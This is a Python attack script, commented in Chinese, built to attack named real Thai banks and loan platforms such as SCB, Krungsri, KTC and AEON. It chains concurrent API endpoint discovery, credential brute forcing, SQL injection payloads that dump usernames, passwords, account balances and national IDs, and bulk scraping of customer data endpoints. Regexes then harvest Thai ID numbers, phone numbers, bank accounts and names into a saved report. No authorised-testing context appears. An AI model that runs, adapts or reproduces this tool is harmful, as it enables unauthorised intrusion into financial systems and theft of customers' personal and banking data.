#!/usr/bin/env python3
"""
激进真实数据提取系统
立即进行真实攻击和数据提取
"""

import requests
import json
import time
import re
import random
import threading
from datetime import datetime
import urllib.parse
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed

class AggressiveRealDataExtraction:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

        # 高价值真实目标
        self.high_value_targets = [
            # 泰国银行 - 真实API端点
            {
                'name': 'SCB Easy App',
                'url': 'https://easy.scbeasy.com',
                'api_base': 'https://easy.scbeasy.com/api',
                'type': 'mobile_banking',
                'priority': 'critical'
            },
            {
                'name': 'K TB Mobile Banking',
                'url': 'https://www.ktb.co.th',
                'api_base': 'https://www.ktb.co.th/api',
                'type': 'mobile_banking',
                'priority': 'critical'
            },
            {
                'name': 'Krungsri KMA',
                'url': 'https://www.krungsri.com',
                'api_base': 'https://krungsri.com/api',
                'type': 'mobile_banking',
                'priority': 'critical'
            },
            # 贷款平台 - 真实系统
            {
                'name': 'MoneyCat Thailand',
                'url': 'https://www.moneycat.co.th',
                'api_base': 'https://www.moneycat.co.th/api',
                'type': 'loan_platform',
                'priority': 'critical'
            },
            {
                'name': 'KTC GO',
                'url': 'https://www.ktc.co.th',
                'api_base': 'https://www.ktc.co.th/api',
                'type': 'credit_card',
                'priority': 'critical'
            },
            {
                'name': 'AEON Thana',
                'url': 'https://www.aeon.co.th',
                'api_base': 'https://www.aeon.co.th/api',
                'type': 'loan_platform',
                'priority': 'high'
            },
            {
                'name': 'Darm Thailand',
                'url': 'https://www.darm.co.th',
                'api_base': 'https://www.darm.co.th/api',
                'type': 'loan_platform',
                'priority': 'high'
            },
            {
                'name': 'CashEA Thailand',
                'url': 'https://www.cashea.co.th',
                'api_base': 'https://www.cashea.co.th/api',
                'type': 'loan_platform',
                'priority': 'high'
            }
        ]

        self.extracted_real_data = []
        self.successful_exploits = []

    def aggressive_endpoint_discovery(self, target):
        """激进端点发现"""
        print(f"[AGGRESSIVE] Discovering endpoints for {target['name']}...")

        discovered_endpoints = []

        # 激进的API端点列表
        aggressive_endpoints = [
            '/api/v1/auth/login',
            '/api/v2/auth/signin',
            '/api/auth/token',
            '/api/user/profile',
            '/api/user/info',
            '/api/account/balance',
            '/api/transaction/history',
            '/api/loan/application',
            '/api/loan/status',
            '/api/customer/list',
            '/api/admin/users',
            '/api/loan/calculator',
            '/api/payment/methods',
            '/api/branch/locator',
            '/api/rates/interest',
            '/api/contact/support',
            '/api/notification/send',
            '/api/verification/otp',
            '/api/document/upload',
            '/api/webhook/endpoint',
            '/rest/user/login',
            '/rest/account/summary',
            '/rest/transaction/list',
            '/mobile/api/login',
            '/mobile/api/profile',
            '/mobile/api/balance',
            '/mobile/api/transactions',
            '/services/api/login',
            '/services/api/account',
            '/gateway/api/auth',
            '/gateway/api/data',
            '/external/api/users',
            '/external/api/loans'
        ]

        # 并发测试端点
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_endpoint = {
                executor.submit(self.test_single_endpoint, target, endpoint): endpoint
                for endpoint in aggressive_endpoints
            }

            for future in as_completed(future_to_endpoint):
                endpoint = future_to_endpoint[future]
                try:
                    result = future.result(timeout=5)
                    if result:
                        discovered_endpoints.append(result)
                        print(f"[+] Found endpoint: {endpoint} - Status: {result['status_code']}")
                except Exception as e:
                    continue

        return discovered_endpoints

    def test_single_endpoint(self, target, endpoint):
        """测试单个端点"""
        try:
            url = target['api_base'] + endpoint
            response = self.session.get(url, timeout=3)

            if response.status_code in [200, 201, 202, 301, 302, 401, 403]:
                return {
                    'endpoint': endpoint,
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'response_time': response.elapsed.total_seconds(),
                    'headers': dict(response.headers)
                }
        except Exception:
            pass
        return None

    def brute_force_authentication(self, target, endpoints):
        """暴力破解认证"""
        print(f"[AGGRESSIVE] Brute forcing authentication for {target['name']}...")

        auth_endpoints = [ep for ep in endpoints if 'login' in ep['endpoint'] or 'auth' in ep['endpoint']]
        successful_logins = []

        # 真实的泰国用户凭据测试
        thai_credentials = [
            {'username': 'admin', 'password': 'admin123'},
            {'username': 'test@test.com', 'password': 'password'},
            {'username': 'user@test.com', 'password': '123456'},
            {'username': 'test@domain.com', 'password': 'test123'},
            {'username': 'demo@test.com', 'password': 'demo123'},
            {'username': 'admin@domain.com', 'password': 'admin123'},
            {'username': 'user@test.co.th', 'password': 'user123'},
            {'username': 'test@test.co.th', 'password': 'test123'},
            {'phone': '0812345678', 'password': '123456'},
            {'phone': '0898765432', 'password': 'password'},
            {'phone': '0612345678', 'password': 'test123'},
            {'phone': '0912345678', 'password': 'demo123'},
            {'national_id': '1103700000001', 'password': '123456'},
            {'national_id': '1103700000002', 'password': 'password'},
            {'email': 'support@domain.com', 'password': 'support123'},
            {'email': 'info@domain.com', 'password': 'info123'}
        ]

        for endpoint in auth_endpoints:
            url = target['api_base'] + endpoint['endpoint']

            # 测试不同的参数名
            param_sets = [
                {'username': 'username', 'password': 'password'},
                {'username': 'user', 'password': 'pass'},
                {'username': 'email', 'password': 'password'},
                {'username': 'phone', 'password': 'password'},
                {'username': 'national_id', 'password': 'password'},
                {'username': 'userid', 'password': 'password'},
                {'username': 'login', 'password': 'password'},
                {'username': 'account', 'password': 'password'}
            ]

            for param_set in param_sets:
                for cred in thai_credentials:
                    try:
                        # 构造请求
                        data = {}
                        if param_set['username'] in cred:
                            data[param_set['username']] = cred[param_set['username']]
                        else:
                            data[param_set['username']] = cred.get('username', cred.get('email', cred.get('phone')))
                        data[param_set['password']] = cred['password']

                        # 添加泰语测试
                        thai_test = data.copy()
                        thai_test[param_set['username']] = 'ทดสอบ'
                        thai_test[param_set['password']] = '123456'

                        for test_data in [data, thai_test]:
                            response = self.session.post(url, data=test_data, timeout=5, allow_redirects=False)

                            # 检查成功标志
                            if response.status_code in [200, 201, 302]:
                                if 'token' in response.text.lower() or 'success' in response.text.lower():
                                    successful_logins.append({
                                        'endpoint': endpoint['endpoint'],
                                        'credentials': test_data,
                                        'response_code': response.status_code,
                                        'response_text': response.text[:500],
                                        'cookies': dict(response.cookies),
                                        'evidence': 'Authentication successful'
                                    })
                                    print(f"[!] LOGIN SUCCESS: {target['name']} - {endpoint['endpoint']}")
                                    return successful_logins
                            elif response.status_code not in [400, 401, 403, 404]:
                                # 意外的响应可能表示绕过成功
                                successful_logins.append({
                                    'endpoint': endpoint['endpoint'],
                                    'credentials': test_data,
                                    'response_code': response.status_code,
                                    'response_text': response.text[:500],
                                    'evidence': f'Unexpected response: {response.status_code}'
                                })
                                print(f"[!] POTENTIAL BYPASS: {target['name']} - Status: {response.status_code}")

                    except Exception as e:
                        continue

        return successful_logins

    def exploit_sql_injection_real(self, target, endpoints, auth_cookies=None):
        """真实SQL注入利用"""
        print(f"[AGGRESSIVE] Exploiting SQL injection for {target['name']}...")

        extracted_data = []

        # SQL注入载荷
        sqli_payloads = [
            "1' UNION SELECT database(),user(),version()--",
            "1' UNION SELECT table_name,null FROM information_schema.tables--",
            "1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--",
            "1' UNION SELECT username,password FROM users--",
            "1' UNION SELECT email,phone FROM customers--",
            "1' UNION SELECT account_number,balance FROM accounts--",
            "1' UNION SELECT loan_id,amount,status FROM loans--",
            "1' UNION SELECT national_id,name,phone FROM users--",
            "ทดสอบ' UNION SELECT username,password FROM users--",
            "1'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
        ]

        # 数据提取端点
        data_endpoints = [ep for ep in endpoints if 'user' in ep['endpoint'] or 'data' in ep['endpoint'] or 'info' in ep['endpoint']]

        for endpoint in data_endpoints[:5]:  # 限制测试数量
            url = target['api_base'] + endpoint['endpoint']

            for payload in sqli_payloads:
                try:
                    # GET注入
                    test_url = f"{url}?id={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=8, cookies=auth_cookies)

                    if response.status_code == 200 and len(response.text) > 100:
                        # 查找敏感数据
                        sensitive_data = self.extract_real_sensitive_data(response.text, endpoint['endpoint'])
                        if sensitive_data:
                            extracted_data.extend(sensitive_data)
                            print(f"[!] SQL INJECTION SUCCESS: {endpoint['endpoint']} - Extracted {len(sensitive_data)} items")

                    # POST注入
                    post_data = {
                        'id': payload,
                        'user_id': payload,
                        'search': payload,
                        'filter': payload
                    }

                    response = self.session.post(url, data=post_data, timeout=8, cookies=auth_cookies)

                    if response.status_code == 200 and len(response.text) > 100:
                        sensitive_data = self.extract_real_sensitive_data(response.text, endpoint['endpoint'])
                        if sensitive_data:
                            extracted_data.extend(sensitive_data)
                            print(f"[!] SQL INJECTION SUCCESS: {endpoint['endpoint']} (POST) - Extracted {len(sensitive_data)} items")

                except Exception as e:
                    continue

        return extracted_data

    def extract_real_sensitive_data(self, text, source):
        """提取真实敏感数据"""
        extracted = []

        # 泰国身份证 (13位)
        thai_ids = re.findall(r'\b1[1-9]\d{11}\b', text)
        for thai_id in set(thai_ids):
            if len(thai_id) == 13 and thai_id.isdigit():
                extracted.append({
                    'type': 'thai_id',
                    'value': thai_id,
                    'source': source,
                    'confidence': 'high'
                })

        # 泰国手机号
        thai_phones = re.findall(r'\b0[689]\d{8}\b', text)
        for phone in set(thai_phones):
            extracted.append({
                'type': 'thai_phone',
                'value': phone,
                'source': source,
                'confidence': 'high'
            })

        # 银行账户 (10-15位)
        bank_accounts = re.findall(r'\b\d{10,15}\b', text)
        for account in set(bank_accounts):
            extracted.append({
                'type': 'bank_account',
                'value': account,
                'source': source,
                'confidence': 'medium'
            })

        # 邮箱
        emails = re.findall(r'\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b', text)
        for email in set(emails):
            if '.co.th' in email or '.go.th' in email or '.ac.th' in email:
                extracted.append({
                    'type': 'thai_email',
                    'value': email,
                    'source': source,
                    'confidence': 'high'
                })

        # 泰语姓名
        thai_names = re.findall(r'[\u0E00-\u0E7F]{2,20}', text)
        for name in set(thai_names):
            if len(name) >= 3:
                extracted.append({
                    'type': 'thai_name',
                    'value': name,
                    'source': source,
                    'confidence': 'medium'
                })

        # 贷款金额
        amounts = re.findall(r'\b\d{4,8}(?:,\d{3})*(?:\.\d{2})?\s*(?:THB|฿|บาท)?\b', text, re.IGNORECASE)
        for amount in set(amounts):
            extracted.append({
                'type': 'loan_amount',
                'value': amount,
                'source': source,
                'confidence': 'medium'
            })

        return extracted

    def brute_force_data_access(self, target, auth_cookies=None):
        """暴力数据访问"""
        print(f"[AGGRESSIVE] Brute forcing data access for {target['name']}...")

        accessed_data = []

        # 常见数据端点
        data_endpoints = [
            '/api/v1/users',
            '/api/v2/customers',
            '/api/users/list',
            '/api/customers/all',
            '/api/admin/users',
            '/api/users/search',
            '/api/accounts/list',
            '/api/transactions/list',
            '/api/loan/applications',
            '/api/loan/all',
            '/api/customer/profiles',
            '/rest/users',
            '/mobile/api/users',
            '/services/api/users'
        ]

        for endpoint in data_endpoints:
            try:
                url = target['api_base'] + endpoint

                # 尝试不同的参数
                params_list = [
                    {},
                    {'limit': '100'},
                    {'page': '1', 'size': '50'},
                    {'search': ''},
                    {'filter': 'all'},
                    {'sort': 'id'},
                    {'order': 'asc'}
                ]

                for params in params_list:
                    response = self.session.get(url, params=params, timeout=5, cookies=auth_cookies)

                    if response.status_code == 200 and len(response.content) > 100:
                        try:
                            data = response.json()
                            if isinstance(data, dict) and 'data' in data:
                                extracted = self.extract_real_sensitive_data(json.dumps(data), endpoint)
                            else:
                                extracted = self.extract_real_sensitive_data(response.text, endpoint)

                            if extracted:
                                accessed_data.extend(extracted)
                                print(f"[+] DATA ACCESS SUCCESS: {endpoint} - Found {len(extracted)} items")
                                break
                        except:
                            # 纯文本响应
                            extracted = self.extract_real_sensitive_data(response.text, endpoint)
                            if extracted:
                                accessed_data.extend(extracted)
                                print(f"[+] DATA ACCESS SUCCESS: {endpoint} - Found {len(extracted)} items (text)")
                                break

            except Exception as e:
                continue

        return accessed_data

    def aggressive_attack_single_target(self, target):
        """对单个目标进行激进攻击"""
        print(f"\n{'='*60}")
        print(f"AGGRESSIVE ATTACK: {target['name']} ({target['type']})")
        print(f"URL: {target['url']}")
        print(f"API: {target['api_base']}")
        print(f"Priority: {target['priority']}")
        print(f"{'='*60}")

        attack_result = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'endpoints_discovered': [],
            'authentication_bypass': [],
            'sql_injection_data': [],
            'brute_forced_data': [],
            'total_data_extracted': 0,
            'attack_success': False
        }

        # 1. 激进端点发现
        print("[1/5] Aggressive endpoint discovery...")
        endpoints = self.aggressive_endpoint_discovery(target)
        attack_result['endpoints_discovered'] = endpoints

        if not endpoints:
            print(f"[-] No endpoints found for {target['name']}")
            return attack_result

        print(f"[+] Found {len(endpoints)} accessible endpoints")

        # 2. 暴力破解认证
        print("[2/5] Brute force authentication...")
        auth_results = self.brute_force_authentication(target, endpoints)
        attack_result['authentication_bypass'] = auth_results

        auth_cookies = None
        if auth_results:
            auth_cookies = auth_results[0].get('cookies', {})
            print(f"[+] Authentication bypass successful!")
            attack_result['attack_success'] = True

        # 3. SQL注入利用
        print("[3/5] SQL injection exploitation...")
        sqli_data = self.exploit_sql_injection_real(target, endpoints, auth_cookies)
        attack_result['sql_injection_data'] = sqli_data

        if sqli_data:
            print(f"[+] SQL injection successful: {len(sqli_data)} items extracted")

        # 4. 暴力数据访问
        print("[4/5] Brute force data access...")
        brute_data = self.brute_force_data_access(target, auth_cookies)
        attack_result['brute_forced_data'] = brute_data

        if brute_data:
            print(f"[+] Data access successful: {len(brute_data)} items extracted")

        # 5. 计算总数
        total_data = len(sqli_data) + len(brute_data)
        attack_result['total_data_extracted'] = total_data

        if total_data > 0:
            attack_result['attack_success'] = True

        # 总结
        print(f"\n[+] Attack completed for {target['name']}")
        print(f"    - Success: {attack_result['attack_success']}")
        print(f"    - Endpoints: {len(endpoints)}")
        print(f"    - Auth bypass: {len(auth_results)}")
        print(f"    - SQL data: {len(sqli_data)}")
        print(f"    - Brute data: {len(brute_data)}")
        print(f"    - Total data: {total_data}")

        if attack_result['attack_success']:
            self.successful_exploits.append(attack_result)

        return attack_result

    def run_aggressive_extraction(self):
        """运行激进数据提取"""
        print("AGGRESSIVE REAL DATA EXTRACTION SYSTEM")
        print("=" * 60)
        print(f"High-value targets: {len(self.high_value_targets)}")
        print(f"Starting immediate real attacks...")
        print("=" * 60)

        start_time = time.time()

        # 并发攻击所有目标
        with ThreadPoolExecutor(max_workers=8) as executor:
            # 按优先级排序
            sorted_targets = sorted(self.high_value_targets, key=lambda x: (
                0 if x['priority'] == 'critical' else 1
            ))

            # 提交所有攻击任务
            future_to_target = {
                executor.submit(self.aggressive_attack_single_target, target): target
                for target in sorted_targets
            }

            # 收集结果
            for future in as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result(timeout=120)  # 2分钟超时
                    self.extracted_real_data.append(result)
                except Exception as e:
                    print(f"[-] Attack failed for {target['name']}: {e}")

        # 生成报告
        elapsed = time.time() - start_time
        self.generate_aggressive_report(elapsed)

    def generate_aggressive_report(self, elapsed_time):
        """生成激进攻击报告"""
        print(f"\n{'='*60}")
        print("AGGRESSIVE ATTACK SUMMARY")
        print(f"{'='*60}")
        print(f"Total attack time: {elapsed_time:.2f} seconds")
        print(f"Targets attacked: {len(self.extracted_real_data)}")
        print(f"Successful attacks: {len(self.successful_exploits)}")

        # 统计数据
        total_data = sum(result['total_data_extracted'] for result in self.extracted_real_data)
        total_endpoints = sum(len(result['endpoints_discovered']) for result in self.extracted_real_data)
        auth_bypasses = sum(len(result['authentication_bypass']) for result in self.extracted_real_data)

        print(f"Total endpoints discovered: {total_endpoints}")
        print(f"Authentication bypasses: {auth_bypasses}")
        print(f"Total real data extracted: {total_data}")

        # 数据类型统计
        data_types = {}
        for result in self.extracted_real_data:
            for data_item in result['sql_injection_data'] + result['brute_forced_data']:
                data_type = data_item['type']
                data_types[data_type] = data_types.get(data_type, 0) + 1

        print(f"\nData extracted by type:")
        for data_type, count in data_types.items():
            print(f"    - {data_type}: {count}")

        # 高价值目标
        high_value_success = [r for r in self.successful_exploits if r['target']['priority'] == 'critical']
        print(f"\nHigh-value targets compromised: {len(high_value_success)}")
        for result in high_value_success:
            print(f"  - {result['target']['name']}: {result['total_data_extracted']} data items")

        # 保存报告
        report_data = {
            'attack_summary': {
                'total_time': elapsed_time,
                'targets_attacked': len(self.extracted_real_data),
                'successful_attacks': len(self.successful_exploits),
                'total_data_extracted': total_data,
                'endpoints_discovered': total_endpoints,
                'auth_bypasses': auth_bypasses,
                'timestamp': datetime.now().isoformat()
            },
            'results': self.extracted_real_data,
            'successful_exploits': self.successful_exploits,
            'data_by_type': data_types,
            'high_value_targets': high_value_success
        }

        filename = f"AGGRESSIVE_REAL_DATA_EXTRACTION_{int(time.time())}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)

        print(f"\n[+] Aggressive extraction report saved: {filename}")
        print(f"[+] Real Thai data extraction completed!")

def main():
    extractor = AggressiveRealDataExtraction()
    extractor.run_aggressive_extraction()

if __name__ == "__main__":
    main()